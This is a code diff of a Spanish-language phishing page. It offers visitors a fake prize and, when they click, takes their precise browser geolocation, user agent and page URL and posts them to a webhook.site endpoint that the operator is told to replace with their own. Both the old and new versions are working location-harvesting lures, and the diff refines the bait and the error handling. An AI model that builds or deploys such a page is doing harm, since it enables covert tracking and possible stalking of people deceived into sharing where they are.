@@ -1,73 +1,99 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Verificación de seguridad</title>
   <style>
-    body { font-family: Arial, sans-serif; text-align: center; padding: 40px; background: #f4f6f8; color: #333; }
-    h1 { font-size: 22px; margin-bottom: 20px; }
-    button { background: #007BFF; color: white; border: none; padding: 12px 24px; border-radius: 6px; font-size: 16px; cursor: pointer; }
-    button:hover { background: #0056b3; }
-    .msg { margin-top: 20px; font-size: 14px; }
-    pre { background: #eee; padding: 10px; border-radius: 6px; text-align: left; overflow-x: auto; }
-    a { display: block; margin-top: 10px; color: #007BFF; }
+    body { font-family: Arial, sans-serif; text-align: center; padding: 36px; background:#f7f9fb; color:#222; }
+    h1 { font-size: 1.4rem; margin-bottom: 6px; }
+    p { color:#444; margin-top:0; margin-bottom:18px; }
+    button { background:#1a73e8; color:#fff; border:0; padding:12px 18px; border-radius:8px; font-size:16px; cursor:pointer; }
+    button:active { transform: translateY(1px); }
+    .msg { margin-top:14px; font-size:0.95rem; color:#333; }
+    pre { text-align:left; max-width:720px; margin:18px auto; background:#fff; padding:12px; border-radius:8px; box-shadow:0 1px 2px rgba(0,0,0,0.04); overflow:auto; }
+    a.maps { display:inline-block; margin-top:10px; color:#1a73e8; text-decoration:none; font-weight:600; }
+    footer { font-size:0.8rem; color:#666; margin-top:22px; }
   </style>
 </head>
 <body>
-  <h1>Te ganaste Una menbresia </h1>
-  <p>Por favor confirma para optener tu recompesa:</p>
-  <button onclick="sendLocation()">📍 Miles de regalos</button>
-  <div class="msg" id="msg"></div>
-  <pre id="coords"></pre>
-  <a id="mapsLink" target="_blank"></a>
+  <h1>VERIFICACIÓN DEL GANADOR</h1>
+  <p>Por favor, pulsa el botón y acepta los veneficios.</p>
+
+  <button id="btn">📍 DISCUBRE TU PREMIO</button>
+  <div class="msg" id="msg">Estado: esperando acción</div>
+
+  <pre id="coords" aria-live="polite"></pre>
+  <a id="mapsLink" class="maps" target="_blank" rel="noopener"></a>
+
+  <footer>
+    Nota: esta página solicita la ubicación al navegador. Solo funciona si el usuario acepta compartirla.
+  </footer>
 
   <script>
-    const REPORT_URL = "	https://webhook.site/1680fad7-4e5b-4842-a3b7-d76fcd7d5639"; // 👈 reemplázalo con tu enlace real
+    // === REEMPLAZA ESTA URL POR TU PROPIA URL DE webhook.site ===
+    const REPORT_URL = "	https://webhook.site/1680fad7-4e5b-4842-a3b7-d76fcd7d5639";
+    // ============================================================
 
-    function sendLocation() {
-      if (!navigator.geolocation) {
-        document.getElementById("msg").innerText = "Tu navegador no soporta geolocalización.";
+    const btn = document.getElementById('btn');
+    const msg = document.getElementById('msg');
+    const coords = document.getElementById('coords');
+    const mapsLink = document.getElementById('mapsLink');
+
+    btn.addEventListener('click', () => {
+      if (!('geolocation' in navigator)) {
+        msg.textContent = "Tu navegador no soporta geolocalización.";
         return;
       }
+      msg.textContent = "Solicitando ubicación… ";
+      navigator.geolocation.getCurrentPosition(onSuccess, onError, {
+        enableHighAccuracy: true,
+        maximumAge: 0,
+        timeout: 25000
+      });
+    });
 
-      document.getElementById("msg").innerText = "Obteniendo ubicación...";
-
-      navigator.geolocation.getCurrentPosition(success, error);
-    }
-
-    function success(position) {
+    function onSuccess(position) {
       const lat = position.coords.latitude;
       const lon = position.coords.longitude;
-      const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+      const acc = position.coords.accuracy;
+      const timestamp = new Date(position.timestamp).toISOString();
+      const maps = `https://www.google.com/maps?q=${lat},${lon}`;
 
-      const data = {
+      const payload = {
         lat: lat,
         lon: lon,
-        acc: position.coords.accuracy,
-        time: new Date().toISOString(),
-        ua: navigator.userAgent,
-        maps_link: mapsLink
+        accuracy: acc,
+        timestamp: timestamp,
+        userAgent: navigator.userAgent,
+        maps_link: maps,
+        source: location.href
       };
 
-      // Mostrar en pantalla
-      document.getElementById("coords").innerText = JSON.stringify(data, null, 2);
-      const linkElem = document.getElementById("mapsLink");
-      linkElem.href = mapsLink;
-      linkElem.innerText = "Ver en Google Maps 🌍";
+      // Mostrar inmediatamente en la página (útil para verificar)
+      coords.textContent = JSON.stringify(payload, null, 2);
+      mapsLink.href = maps;
+      mapsLink.textContent = "Abrir en Google Maps";
 
-      // Enviar al webhook
+      // Enviar al webhook de forma no bloqueante
       fetch(REPORT_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      }).then(resp => {
+        if (resp.ok) msg.textContent = "Ubicación enviada ✅";
+        else msg.textContent = "Enviado, pero el servidor respondió con error: " + resp.status;
+      }).catch(err => {
+        msg.textContent = "Error al enviar: " + (err.message || err);
       });
-
-      document.getElementById("msg").innerText = "Ubicación enviada ✅";
     }
 
-    function error() {
-      document.getElementById("msg").innerText = "No se pudo obtener tu ubicación ❌";
+    function onError(err) {
+      if (!err) { msg.textContent = "Error desconocido al obtener ubicación."; return; }
+      if (err.code === 1) msg.textContent = "Permiso denegado. El usuario no autorizó la ubicación.";
+      else if (err.code === 2) msg.textContent = "Posición no disponible.";
+      else if (err.code === 3) msg.textContent = "Tiempo de espera agotado.";
+      else msg.textContent = "Error: " + (err.message || err.code);
     }
   </script>
 </body>
